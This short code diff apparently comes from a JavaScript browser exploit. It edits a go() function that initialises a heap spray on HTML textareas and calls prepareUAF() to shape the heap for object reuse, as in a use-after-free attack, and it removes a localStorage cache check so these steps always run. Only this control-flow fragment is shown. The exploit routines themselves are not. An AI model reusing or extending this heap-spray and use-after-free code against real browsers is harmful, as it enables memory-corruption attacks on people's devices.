@@ -444,7 +444,6 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	if(localStorage.isPrbCached){
 		/* Init spray */
 		sprayHTMLTextArea();
 
@@ -454,5 +453,4 @@ function go() {
 		g_input = input1;
 		/* Shape heap layout for obj. reuse */
 		prepareUAF();
-	}
 }
